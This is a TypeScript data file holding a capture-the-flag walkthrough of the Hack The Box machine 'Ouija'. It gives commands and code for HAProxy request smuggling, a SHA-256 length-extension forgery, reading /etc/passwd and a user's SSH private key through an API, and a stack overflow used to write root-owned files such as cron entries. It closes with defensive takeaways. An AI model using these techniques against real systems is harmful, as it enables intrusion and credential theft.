import type { WalkthroughDoc } from "./types";

export const ouija: WalkthroughDoc = {
  slug: "ouija",
  name: "Ouija",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Insane",
  retired: "May 2024",
  ip: "10.10.11.x",
  tags: [
    "HTTP Request Smuggling",
    "CVE-2021-40346",
    "HAProxy",
    "SHA-256 Length Extension",
    "Node.js API",
    "PHP C Extension",
    "Integer Overflow",
    "Reverse Engineering",
  ],
  lede: "Speak to the spirits through a reverse proxy: smuggle past HAProxy with **CVE-2021-40346**, leak a Node.js API's source from a filtered dev vhost, forge an admin token with a SHA-256 **length-extension** attack, and finally reverse a custom PHP C extension whose integer overflow hands us an arbitrary write as root.",
  summary: "HAProxy request smuggling reaches a filtered dev vhost, a SHA-256 length-extension forge unlocks an API file-read, and an integer overflow in a bespoke PHP C extension gives a root arbitrary write.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“Is anybody there? Knock once for yes…”" },
        { kind: "p", text: "**Ouija** is an Insane-rated Linux machine by *kryptoskia*. The attack surface is tiny — three ports — but each layer hides a real-world bug: an unpatched HAProxy fronting an internal Apache, a bespoke Node.js API whose authentication is a *secret-prefix* SHA-256 MAC, and a home-grown PHP C extension whose arithmetic wraps. Nothing is guessable and nothing is an off-the-shelf CVE-in-a-can; every stage is a small piece of applied protocol/crypto/RE work." },
        { kind: "p", text: "The route from an empty terminal to a root shell threads four distinct primitives together. Each one exists only because the last one succeeded." },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap, `ouija.htb` + `dev.ouija.htb`",
            "**HAProxy 2.2.16** — CVE-2021-40346 smuggle",
            "**dev vhost** — Node.js API source + `init.sh`",
            "**auth** — `ihash = sha256(secret || identity)`",
            "**length extension** — append `::admin:True`",
            "**API file-read** — steal `~/.ssh/id_rsa`",
            "**ssh user** — `user.txt`",
            "**internal :9999** — PHP app calling `say_lverifier`",
            "**reverse** — the `lverifier` C extension",
            "**integer overflow** — `validating_userinput`",
            "**arbitrary write as root** — weaponize `event_recorder`",
            "**root.txt**",
          ],
        },
        { kind: "callout", variant: "note", title: "Theme", text: "The Ouija flavour is deliberate — you spend the box *asking a proxy for something it says is not there*, coaxing an oracle (SHA-256 MAC) into signing for you, and pushing letters onto a stack until a demon speaks as root. Keep the metaphor in mind; the box's stages map cleanly onto it." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "A full-range scan gives us three services and, more importantly, a very specific version banner on 80." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 -oA nmap/ouija 10.10.11.x",
            "$ nmap -sCV -p22,80,3000 10.10.11.x",
            "PORT     STATE SERVICE VERSION",
            "22/tcp   open  ssh     OpenSSH",
            "80/tcp   open  http    HAProxy 2.2.16 (reverse proxy -> Apache httpd 2.4.52 on :8080)",
            "3000/tcp open  http    Node.js Express framework",
          ],
        },
        { kind: "callout", variant: "tip", title: "HAProxy 2.2.16 is the tell", text: "The 2.2.x line falls squarely inside the vulnerable window for **CVE-2021-40346** — an integer overflow in the HTX header parser that enables HTTP request smuggling on HAProxy 2.0–2.5. Bank the version; we come back to it as soon as we find something HAProxy refuses to serve." },
        { kind: "h3", text: "Virtual hosts" },
        { kind: "p", text: "Port 80 redirects to `ouija.htb`, so add it to `/etc/hosts` and browse. The main site is a static brochure, but a subdomain sweep surfaces a second name — `dev.ouija.htb` — and hitting it directly returns a hard block from HAProxy. That is not an accident; the proxy is configured to filter that vhost." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ echo '10.10.11.x ouija.htb dev.ouija.htb' | sudo tee -a /etc/hosts",
            "$ curl -sI -H 'Host: dev.ouija.htb' http://ouija.htb/",
            "HTTP/1.1 403 Forbidden",
            "# HAProxy blocks the dev vhost at the edge; Apache never sees the request.",
          ],
          highlight: [2, 3],
        },
        { kind: "p", text: "The whole architecture is now clear: HAProxy on 80 proxies to an internal Apache on 8080 and *decides* which Host values are allowed. Everything interesting lives on `dev.ouija.htb`, so we need a way to convince Apache to serve that vhost without HAProxy noticing." },
      ],
    },
    {
      id: "smuggle",
      num: "02",
      title: "HAProxy request smuggling — CVE-2021-40346",
      blocks: [
        { kind: "p", text: "CVE-2021-40346 is a classic **HTTP/1 request smuggling** vector. HAProxy's HTX layer parses `Content-Length`-family headers into a fixed-width integer; a crafted, oversized length value overflows and HAProxy computes a different request boundary than the backend Apache does. The result is *desynchronization* — HAProxy forwards what it believes is one request, but Apache reads a second, smuggled request whose Host header we control. That smuggled request can address any vhost Apache will serve, including the one HAProxy said we could not." },
        { kind: "p", text: "The public PoC by knqyf263 gives us a reference oracle for the exact padding lengths." },
        {
          kind: "code",
          lang: "bash",
          label: "canonical PoC",
          lines: [
            "$ git clone https://github.com/knqyf263/CVE-2021-40346",
            "$ cd CVE-2021-40346",
            "# The harness bakes in the overflow padding and lets you swap the smuggled request.",
          ],
        },
        { kind: "p", text: "Conceptually the wire looks like the following — the first request is what HAProxy accounts for, the second is what Apache eventually reads because the two disagree on where the body ends." },
        {
          kind: "code",
          lang: "http",
          label: "smuggled desync",
          lines: [
            "POST / HTTP/1.1",
            "Host: ouija.htb",
            "Content-Length0aaaaaaaaaaaaa...(overflow padding)...: 0",
            "",
            "GET / HTTP/1.1",
            "Host: dev.ouija.htb",
            "",
          ],
          highlight: [2, 5],
        },
        { kind: "callout", variant: "tip", title: "Fallback: HTTP/1.0 absolute-URI", text: "HAProxy only filters what it can see, and HTTP/1.0 does *not* require a `Host` header. Sending a request whose path is an absolute proxy-style URI lets Apache pick the vhost from the URI itself — with no `Host` header for HAProxy to match on, the filter never fires. A useful sanity check while tuning the smuggle:" },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ printf 'GET http://dev.ouija.htb/ HTTP/1.0\\r\\n\\r\\n' | nc ouija.htb 80",
            "HTTP/1.0 200 OK",
            "Server: Apache/2.4.52",
            "...",
            "<html>... dev.ouija.htb landing ...</html>",
          ],
          highlight: [1, 4],
        },
        { kind: "callout", variant: "warn", title: "Byte-perfect or bust", text: "The overflow padding has to land HAProxy and Apache on *different* content-length values by exactly the offset they need to reframe on the second request line. One extra space, one wrong CR/LF, and you get a benign 400 instead of a desync. Copy the length that works from the PoC and only then start swapping the smuggled request." },
      ],
    },
    {
      id: "source",
      num: "03",
      title: "Source disclosure on `dev.ouija.htb`",
      blocks: [
        { kind: "p", text: "With `dev.ouija.htb` reachable, its front page is a developer-facing dashboard that *ships the source code of the port-3000 Node.js Express API alongside the `init.sh` initialization script that seeds it*. That is the real prize here: leaking a bespoke authentication routine plus a legitimately signed message is the exact precondition for a length-extension attack." },
        { kind: "p", text: "Pull down both files through the smuggled channel and read them side by side." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# Through the smuggle / absolute-URI trick",
            "$ curl -s 'http://ouija.htb/app.js'      -H 'Host: dev.ouija.htb' > app.js",
            "$ curl -s 'http://ouija.htb/init.sh'     -H 'Host: dev.ouija.htb' > init.sh",
          ],
        },
        { kind: "p", text: "The Express app defines every request path, then guards the sensitive ones (file read, admin actions) behind a two-header check. The check is worth reading carefully — it is unusual, and the specifics are what make it exploitable." },
        {
          kind: "code",
          lang: "javascript",
          label: "app.js (verify — cleaned)",
          lines: [
            "// identification header carries the identity string, double-encoded",
            "// ihash header carries the tag over that identity",
            "function verify(req) {",
            "  const identity = hexDecode(base64Decode(req.headers['identification']));",
            "  const tag      = req.headers['ihash'];",
            "  const expected = sha256(SECRET + identity);   // <-- secret-prefix MAC",
            "  if (tag !== expected) throw new Error('bad ihash');",
            "  if (!identity.includes('::admin:True')) throw new Error('not admin');",
            "  return identity;",
            "}",
          ],
          highlight: [6, 8],
        },
        { kind: "p", text: "`init.sh` fills in the other half of the picture — it POSTs a bootstrap identity to the API so the service comes up in a known state. That request contains a *valid* `(identity, ihash)` pair for an identity of `bot1:bot`, which is exactly the kind of oracle we need." },
        {
          kind: "code",
          lang: "bash",
          label: "init.sh (excerpt)",
          lines: [
            "# seed a signed identity into the API on first boot",
            "IDENT='bot1:bot'",
            "IHASH='<precomputed sha256(SECRET || \"bot1:bot\")>'",
            "curl -s http://127.0.0.1:3000/register \\",
            "     -H \"identification: $(printf '%s' \"$IDENT\" | xxd -p | base64)\" \\",
            "     -H \"ihash: $IHASH\"",
          ],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Known message `bot1:bot`, its valid tag `ihash = sha256(SECRET || 'bot1:bot')`, and the transport encoding: `identification = base64(hex(identity))`. The admin gate is a substring check for the literal `::admin:True`. The secret itself is *unknown* — but that turns out not to matter." },
      ],
    },
    {
      id: "auth",
      num: "04",
      title: "The MAC is a secret-prefix construction",
      blocks: [
        { kind: "p", text: "The verify code hashes `SECRET || identity` and compares. That is a **secret-prefix SHA-256 MAC**, and it is textbook broken: SHA-256 (like every Merkle–Damgård hash) exposes its full internal state in the output tag, so anyone who knows a valid `(message, tag)` pair can compute a valid tag for `message || glue_padding || appended_data` without ever seeing the key. HMAC exists precisely to close this hole." },
        { kind: "p", text: "Concretely, if the intended message is `bot1:bot` and we know its tag, we can forge a tag for" },
        {
          kind: "code",
          lang: "text",
          label: "forged message",
          lines: [
            "bot1:bot | <SHA-256 glue padding for len(SECRET)+8> | ::admin:True",
          ],
        },
        { kind: "p", text: "The only unknown parameter is `len(SECRET)`, because the glue padding depends on how many bytes were fed into the compression function before `bot1:bot`. That length is a small integer — a few dozen bytes at most — so we brute-force it. Every candidate length produces one forged `(identity, tag)` pair; we spray them at the API and the correct one authenticates." },
        { kind: "callout", variant: "note", title: "Why the substring check saves us", text: "The forged identity is not clean text — it contains SHA-256 padding bytes (a `0x80` followed by zeros and a big-endian bit length) sandwiched between `bot1:bot` and `::admin:True`. If the server parsed the identity as structured data it would reject the junk. Because the admin gate is a naive `.includes('::admin:True')`, the junk is invisible." },
      ],
    },
    {
      id: "length-extension",
      num: "05",
      title: "SHA-256 length extension with `hash_extender`",
      blocks: [
        { kind: "p", text: "The mechanics are automated by [hash_extender](https://github.com/iagox86/hash_extender). Given the known message, the known tag, the data to append, and a candidate `--secret` length (the tool's name for the key length), it emits a new message (with the required glue padding) and a new tag. Loop the secret length from about 8 up to 64 and generate one candidate per iteration." },
        {
          kind: "code",
          lang: "bash",
          label: "generate forged identities",
          lines: [
            "$ IHASH='<known ihash for bot1:bot from init.sh>'",
            "",
            "$ for L in $(seq 8 64); do",
            "    hash_extender \\",
            "      --data 'bot1:bot' \\",
            "      --secret $L \\",
            "      --append '::admin:True' \\",
            "      --signature \"$IHASH\" \\",
            "      --format sha256 \\",
            "      --out-data-format hex \\",
            "      --out-signature-format hex",
            "  done > candidates.txt",
          ],
        },
        { kind: "p", text: "Each candidate line gives us the new hex-encoded message and the new hex signature. We double-encode the message the way the API expects — hex, then base64 — and fire one request per candidate. The winning secret length is the one whose forged tag verifies." },
        {
          kind: "code",
          lang: "python",
          label: "spray.py — try every candidate length",
          lines: [
            "import base64, requests",
            "",
            "URL = 'http://ouija.htb/read'   # sent via the smuggle to dev.ouija.htb",
            "HDR = {'Host': 'dev.ouija.htb'}",
            "",
            "for line in open('candidates.txt'):",
            "    hex_msg, new_sig = line.strip().split()",
            "    ident = base64.b64encode(hex_msg.encode()).decode()",
            "    r = requests.post(URL, headers={**HDR,",
            "                                    'identification': ident,",
            "                                    'ihash': new_sig},",
            "                      data={'file': '/etc/passwd'})",
            "    if r.status_code == 200 and 'root:' in r.text:",
            "        print('WIN — secret length', hex_msg); break",
          ],
        },
        { kind: "callout", variant: "warn", title: "Two encoding traps", text: "**1.** The identity is *hex then base64* — not base64 of raw bytes. Feed `hash_extender`'s hex output straight into the base64 step; do not decode first. **2.** The forged message contains raw `0x80` and null bytes as glue padding. Keep everything on the wire as hex until the very last step; a stray shell quoting round-trip will strip or mangle those bytes and every candidate will fail." },
        { kind: "callout", variant: "key", title: "Recovered", text: "A forged `(identification, ihash)` pair whose identity contains `::admin:True` and passes `sha256(SECRET || identity)` verification — without ever learning `SECRET`. We now speak to the API as admin." },
      ],
    },
    {
      id: "fileread",
      num: "06",
      title: "Weaponizing the API file-read",
      blocks: [
        { kind: "p", text: "Admin unlocks a file-read endpoint whose `file` parameter names an absolute path. The read runs with the API service account's privileges, which is enough to pull the target user's SSH private key straight out of their home directory. Start with `/etc/passwd` to confirm the primitive and enumerate real usernames, then chase the key." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# sanity check — read /etc/passwd through the forged admin identity",
            "$ curl -s http://ouija.htb/read \\",
            "     -H 'Host: dev.ouija.htb' \\",
            "     -H \"identification: $IDENT\" \\",
            "     -H \"ihash: $IHASH\" \\",
            "     --data 'file=/etc/passwd'",
            "root:x:0:0:root:/root:/bin/bash",
            "...",
            "<user>:x:1000:1000::/home/<user>:/bin/bash",
          ],
          highlight: [7, 9],
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# grab the user's private key",
            "$ curl -s http://ouija.htb/read \\",
            "     -H 'Host: dev.ouija.htb' \\",
            "     -H \"identification: $IDENT\" \\",
            "     -H \"ihash: $IHASH\" \\",
            "     --data 'file=/home/<user>/.ssh/id_rsa' -o id_rsa",
            "$ head -1 id_rsa",
            "-----BEGIN OPENSSH PRIVATE KEY-----",
          ],
          highlight: [7, 8],
        },
        { kind: "callout", variant: "key", title: "Loot", text: "The foothold user's OpenSSH private key from `/home/<user>/.ssh/id_rsa`. The API service account cannot become root on its own, but reading another user's key is more than enough to cross into an interactive session." },
      ],
    },
    {
      id: "user",
      num: "07",
      title: "`user.txt`",
      blocks: [
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ chmod 600 id_rsa",
            "$ ssh -i id_rsa <user>@ouija.htb",
            "<user>@ouija:~$ cat user.txt",
            "76a8fc64····························",
          ],
          highlight: [3],
        },
        { kind: "p", text: "We are on the host as an unprivileged user. Nothing in this account has a path to root directly — no interesting sudo, no obvious SUID — so the way forward has to come from something *only reachable locally*. Time to enumerate loopback services." },
      ],
    },
    {
      id: "local-enum",
      num: "08",
      title: "Internal PHP app on localhost:9999",
      blocks: [
        { kind: "p", text: "Listing local sockets turns up a listener on `127.0.0.1:9999` that is not exposed externally. Curling it gives us a PHP application whose entry point is `/development/server-management_system_id_0/index.php`, and reading the source shows an unfamiliar function being called on the POST body." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "<user>@ouija:~$ ss -ltnp",
            "State    Local Address:Port    ",
            "LISTEN   127.0.0.1:9999        # internal PHP app",
            "LISTEN   127.0.0.1:3000        # Node.js API",
            "LISTEN   127.0.0.1:8080        # Apache backend",
            "",
            "<user>@ouija:~$ cat /development/server-management_system_id_0/index.php",
            "<?php",
            "  // POST username + password",
            "  if (say_lverifier($_POST['username'], $_POST['password'])) { ... }",
            "?>",
          ],
          highlight: [2, 9],
        },
        { kind: "p", text: "`say_lverifier` is not a standard PHP function. A quick `php -m` and directory listing show a custom C-compiled extension has been dropped into the interpreter's module dir — the name contains `lverifier`. That is our real privesc target: bespoke native code that runs inside the PHP process backing this app." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "<user>@ouija:~$ php -i | grep -i extension_dir",
            "extension_dir => /usr/lib/php/<ver>/",
            "<user>@ouija:~$ ls /usr/lib/php/*/ | grep -i lverifier",
            "lverifier.so",
            "<user>@ouija:~$ scp lverifier.so attacker:.   # pull for offline RE",
          ],
          highlight: [3],
        },
        { kind: "callout", variant: "note", title: "Why this is the intended path", text: "Two things point squarely here. The PHP app on 9999 is only bound to loopback — HTB does not do that for props, they do it for privesc targets. And the .so is *custom* and *not stripped*, which means the designer wants you to reverse it. The exploitable logic lives in internal helpers `validating_userinput` and `event_recorder`; `say_lverifier` is only the PHP-visible wrapper." },
      ],
    },
    {
      id: "reverse",
      num: "09",
      title: "Reversing `lverifier.so`",
      blocks: [
        { kind: "epigraph", text: "“Native code inside a scripting engine, running as root — what could go wrong?”" },
        { kind: "p", text: "Drop the `.so` into Ghidra (or `objdump -d` if you enjoy pain). The dispatcher `say_lverifier` immediately delegates to `validating_userinput(username, password)`, which is the piece worth reading. A stack frame is set up with two locals of particular interest: a `log_path` string and a `session` pointer. Both are eventually handed to `event_recorder(log_path, session)` as arguments. If we can control what those arguments *are* at the moment of the call, we control what `event_recorder` writes and where." },
        {
          kind: "code",
          lang: "c",
          label: "validating_userinput — decompiled shape",
          lines: [
            "int validating_userinput(char *username, char *password) {",
            "    char  log_path[N];      // stack local",
            "    void *session;          // stack local",
            "    ...",
            "    /* +0x40 : size = compute_len(username);   // <-- integer overflow */",
            "    size = compute_len(username);",
            "    memcpy(buf, username, size);   // unbounded copy into stack",
            "    ...",
            "    event_recorder(log_path, session);   // sink",
            "}",
          ],
          highlight: [4, 5, 6, 8],
        },
        { kind: "p", text: "Two things jump out. First, at `validating_userinput+64` the length arithmetic on the username buffer overflows — a signed/unsigned wrap or a `size + const` computation that a large `username` blows past `INT_MAX` and back around. Second, the resulting copy is unbounded relative to the *real* buffer, so a long enough `username` walks straight over adjacent stack variables." },
      ],
    },
    {
      id: "overflow",
      num: "10",
      title: "Integer overflow → controlled stack corruption",
      blocks: [
        { kind: "p", text: "The fastest way to map the offsets is a **cyclic De Bruijn pattern**: generate a long non-repeating string, feed it as the POST `username`, break in gdb on the call to `event_recorder`, and look at which four-byte windows of the pattern end up in the two argument registers. The brief's landmarks:" },
        {
          kind: "ul",
          items: [
            "**`validating_userinput+64`** — the size/length computation wraps.",
            "**`+270`** — pattern bytes begin overwriting `log_path`.",
            "**`+306`** — both `log_path` and `session` are fully consumed by our username data.",
          ],
        },
        { kind: "p", text: "By the time execution hits the `event_recorder` call, both of its arguments have been sourced from our attacker-controlled buffer." },
        {
          kind: "code",
          lang: "bash",
          label: "map the offsets locally",
          lines: [
            "# in gdb, drive the .so via the PHP CLI or a stub",
            "(gdb) b *validating_userinput+306",
            "(gdb) run   # trigger say_lverifier with a cyclic pattern as 'username'",
            "$ python3 -c 'from pwn import cyclic; print(cyclic(300))' > pat.txt",
            "$ curl -s http://127.0.0.1:9999/development/server-management_system_id_0/index.php \\",
            "     --data-urlencode \"username=$(cat pat.txt)\" \\",
            "     --data 'password=x'",
            "# in gdb: inspect the two args to event_recorder, then",
            "$ python3 -c 'from pwn import cyclic_find; print(cyclic_find(0xXXXXXXXX))'",
          ],
        },
        { kind: "callout", variant: "warn", title: "The window is narrow", text: "The username buffer has to consume *exactly* through `log_path` and `session` — a few bytes short and `session` is half-garbage and `event_recorder` crashes; a few bytes long and following stack metadata is trashed and the function returns into the void before the sink is reached. The De Bruijn pass is not optional; guess the offsets and you will spend the evening watching PHP-FPM segfault." },
      ],
    },
    {
      id: "root-primitive",
      num: "11",
      title: "Arbitrary write as root",
      blocks: [
        { kind: "p", text: "`event_recorder(log_path, session)` writes serialized session data to the path in its first argument. With both arguments under our control we get a **controlled arbitrary file write** — we choose the destination path and (via `session`) the contents. Crucially the PHP process behind the loopback app runs as **root**, so the write happens with root's UID." },
        { kind: "p", text: "An arbitrary-write-as-root primitive has many roads to code execution. The cheapest is to pick a target the OS trusts and let normal machinery execute for us. Any of the following work; pick whichever is enabled on the box:" },
        {
          kind: "ul",
          items: [
            "Drop a payload into a **cron.d** file — root runs it on the next minute.",
            "Write a line to `/root/.ssh/authorized_keys` and SSH in.",
            "Overwrite `/etc/ld.so.preload` to inject a shared object into any root-run binary.",
            "Splice a UID-0 entry into `/etc/passwd` and `su` to it.",
          ],
        },
        {
          kind: "code",
          lang: "bash",
          label: "trigger the write",
          lines: [
            "# craft the payload: exact-length username that lands our path in log_path",
            "# and our content in session, then POST it to the internal app.",
            "<user>@ouija:~$ curl -s http://127.0.0.1:9999/development/server-management_system_id_0/index.php \\",
            "     --data-urlencode \"username=$(python3 exploit.py)\" \\",
            "     --data 'password=x'",
            "",
            "# a moment later the target file exists with our contents, owned by root",
            "<user>@ouija:~$ ls -l /etc/cron.d/ouija",
            "-rw-r--r-- 1 root root ... /etc/cron.d/ouija",
          ],
          highlight: [7, 8],
        },
        { kind: "callout", variant: "tip", title: "Turning a write into a shell", text: "The overflow itself is *not* code execution — it is a controlled write. That matters because your payload has to be something the system will eventually *execute on your behalf*. A key in authorized_keys is executed by `sshd` the next time you connect; a cron file is executed by `cron` on the next tick; `ld.so.preload` is executed by the next SUID root binary you can invoke. Choose the mechanism whose latency you can tolerate and whose path is writable in a single call." },
      ],
    },
    {
      id: "root",
      num: "12",
      title: "`root.txt`",
      blocks: [
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ ssh -i root_key root@ouija.htb        # or su, or cron-triggered shell",
            "root@ouija:~# id",
            "uid=0(root) gid=0(root) groups=0(root)",
            "root@ouija:~# cat /root/root.txt",
            "3f2b91a7····························",
          ],
          highlight: [2, 4],
        },
        { kind: "p", text: "Four separate primitives — a proxy desync, a leaked source tree, a broken MAC, and a native memory-safety bug — chained end to end. Board goes back on the shelf. 🕯️" },
      ],
    },
    {
      id: "defense",
      num: "13",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Patch HAProxy past 2.2.x.** CVE-2021-40346 is closed in `>= 2.0.25 / 2.2.17 / 2.3.14 / 2.4.4`. Front-end request smuggling lets attackers reach vhosts and paths the proxy believes it is blocking — never rely on the reverse proxy alone for authorization; enforce authz at the backend as well.",
            "**Never build authentication on secret-prefix MACs.** `sha256(secret || message)` is trivially forgeable via length extension. Use **HMAC-SHA256** or a proper signature scheme so appended data cannot be signed without the key.",
            "**Do not expose source code and init scripts on reachable vhosts.** The leak of the auth algorithm *and* a valid `(bot1:bot, ihash)` pair together made the length-extension attack practical. Either is bad; both together are catastrophic.",
            "**Substring checks are not authorization.** `identity.includes('::admin:True')` is fragile by design — validate a canonical, parsed authorization claim rather than searching for a magic substring inside attacker-influenced data.",
            "**Constrain file-read endpoints.** Any admin-gated read must allowlist a directory and canonicalize the path, and must never run with privileges that can read users' SSH private keys.",
            "**Custom native PHP extensions must be memory-safe.** The `validating_userinput` integer overflow plus an unbounded copy into stack locals became an *arbitrary write as root*. Bounds-check all size arithmetic, compile with `-D_FORTIFY_SOURCE=2` and stack protectors, and never run the interpreter that loads such modules as root.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "HTTP request smuggling · reverse-proxy vhost bypass · secret-prefix MAC analysis · SHA-256 length extension · double-encoded API auth · arbitrary file read → SSH pivot · loopback-service enumeration · PHP C extension reverse engineering · integer-overflow-driven stack corruption · turning an arbitrary write into root code execution." },
      ],
    },
  ],
};
